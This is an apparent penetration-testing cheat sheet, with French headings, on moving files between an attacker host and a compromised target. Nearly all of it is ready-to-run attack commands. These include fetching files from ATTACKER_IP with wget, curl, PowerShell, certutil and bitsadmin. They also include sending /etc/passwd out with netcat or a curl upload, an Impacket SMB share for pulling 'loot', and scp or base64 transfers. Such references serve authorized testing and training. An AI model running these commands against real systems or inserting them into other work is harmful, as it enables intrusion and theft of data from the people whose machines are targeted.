# File Transfers

---

## Attacker -> Cible

### Serveur HTTP (attacker)
```bash
# Python
python3 -m http.server 8080

# PHP
php -S 0.0.0.0:8080
```

### Download (cible Linux)
```bash
wget http://ATTACKER_IP:8080/file -O /tmp/file
curl http://ATTACKER_IP:8080/file -o /tmp/file
```

### Download (cible Windows)
```powershell
# PowerShell
Invoke-WebRequest -Uri http://ATTACKER_IP:8080/file -OutFile C:\Temp\file
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8080/file','C:\Temp\file')
iwr http://ATTACKER_IP:8080/file -o C:\Temp\file

# Certutil
certutil -urlcache -split -f http://ATTACKER_IP:8080/file C:\Temp\file

# Bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER_IP:8080/file C:\Temp\file
```

---

## Cible -> Attacker

### Netcat
```bash
# Attacker (réception)
nc -lvnp 9999 > received_file

# Cible (envoi)
nc ATTACKER_IP 9999 < /etc/passwd
cat /etc/passwd | nc ATTACKER_IP 9999
```

### Upload server (attacker)
```bash
# Python uploadserver
pip3 install uploadserver
python3 -m uploadserver 8080

# Depuis la cible
curl -X POST http://ATTACKER_IP:8080/upload -F 'files=@/etc/passwd'
```

---

## SMB (Windows <-> Linux)

### Serveur SMB (attacker)
```bash
# Impacket
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -user admin -password admin
```

### Client (cible Windows)
```cmd
:: Copier depuis le share
copy \\ATTACKER_IP\share\file.exe C:\Temp\file.exe

:: Copier vers le share
copy C:\Temp\loot.txt \\ATTACKER_IP\share\loot.txt

:: Monter le share
net use Z: \\ATTACKER_IP\share /user:admin admin
```

---

## SCP (si SSH disponible)

```bash
# Attacker -> Cible
scp file.txt user@TARGET_IP:/tmp/file.txt

# Cible -> Attacker
scp user@TARGET_IP:/etc/passwd ./passwd
```

---

## Base64 (pas de transfert réseau)

```bash
# Encoder sur la source
base64 -w0 file.bin

# Décoder sur la destination
echo "BASE64_STRING" | base64 -d > file.bin

# Windows
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\file.bin"))
[IO.File]::WriteAllBytes("C:\file.bin", [Convert]::FromBase64String("BASE64_STRING"))
```
